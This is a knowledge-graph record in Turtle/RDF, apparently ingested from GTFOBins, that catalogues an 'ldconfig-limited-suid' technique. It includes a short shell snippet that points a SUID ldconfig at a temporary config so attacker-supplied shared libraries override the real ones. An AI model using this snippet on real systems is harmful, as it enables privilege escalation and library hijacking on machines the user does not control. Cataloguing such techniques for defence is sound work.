mknd:command_ldconfig-limited-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ldconfig-limited-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries." ;
    d3f:uses mknd:executable_ldconfig ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ldconfig ;
    mknd:provides mknd:function_limited-suid ;
    mknd:value """TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
./ldconfig -f "$TF/conf"
""" .

